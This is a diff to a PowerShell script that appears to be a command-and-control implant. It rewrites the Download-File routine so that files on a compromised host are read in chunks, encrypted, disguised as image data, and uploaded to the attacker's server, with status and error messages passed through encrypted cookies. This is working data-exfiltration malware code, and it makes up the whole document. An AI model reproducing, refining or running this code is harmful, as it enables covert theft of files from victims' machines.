@@ -341,15 +341,19 @@ function Download-Files
     $files = Get-ChildItem $Directory -Recurse | Where-Object{!($_.PSIsContainer)}
     foreach ($item in $files)
     {
-        $ReadCommand = "download-file "+$item.FullName
-        $ReadCommand = Encrypt-String $key $ReadCommand
-        $Output = Download-File $item.FullName       
-        $Output = Encrypt-String2 $key $Output
-        $UploadBytes = getimgdata $Output
-        (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
+        Download-File $item.FullName
     } 
-    $ReadCommand = "Files-downloaded"
-    $ReadCommand = Encrypt-String $key $ReadCommand
+}
+function Get-RandomName 
+{
+    param (
+        [int]$Length
+    )
+    $set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
+    $result = ''
+    for ($x = 0; $x -lt $Length; $x++) 
+    {$result += $set | Get-Random}
+    return $result
 }
 function Download-File
 {
@@ -357,24 +361,44 @@ function Download-File
     (
         [string] $Source
     )
- 
-    $Source = Resolve-PathSafe $Source
-     
-    $bufferSize = 90000
-    $buffer = New-Object byte[] $bufferSize
-     
-    $reader = [System.IO.File]::OpenRead($Source)
-    $base64 = $null
-     
-    $bytesRead = 0
-    do
+    try {
+    $Orig = $Source
+    $path = Resolve-PathSafe $Source
+    $randomname = Get-RandomName -Length 5
+    $fileonly = split-path $path -leaf
+    $fullnewname = $randomname + "_" + $fileonly
+    $chunkSize=10737418
+    $reader = [System.IO.File]::OpenRead($path)
+    $count = 0
+    $buffer = New-Object Byte[] $chunkSize
+    $hasMore = $true
+    while($hasMore)
     {
-        $bytesRead = $reader.Read($buffer, 0, $bufferSize);
-        $base64 += ([Convert]::ToBase64String($buffer, 0, $bytesRead));
-    } while ($bytesRead -eq $bufferSize);
+        $bytesRead = $reader.Read($buffer, 0, $buffer.Length)
+        $output = $buffer
+        if ($bytesRead -ne $buffer.Length)
+        {
+            $hasMore = $false
+            $output = New-Object Byte[] $bytesRead
+            [System.Array]::Copy($buffer, $output, $bytesRead)
+        }
 
-    $base64
-    $reader.Dispose()
+        $ReadCommand = "download-file "+$fullnewname
+        $ReadCommand = Encrypt-String $key $ReadCommand  
+        $send = Encrypt-String3 $key $output
+        $UploadBytes = getimgdata $send
+        (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
+        ++$count
+    }
+    $reader.Close()
+    } catch {
+        $Output = "ErrorCmd: " + $error[0]
+        $ReadCommand = "Error downloading file "+$fullnewname
+        $ReadCommand = Encrypt-String $key $ReadCommand  
+        $send = Encrypt-String2 $key $output
+        $UploadBytes = getimgdata $send
+        (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
+    }
 }
 function Upload-File 
 {
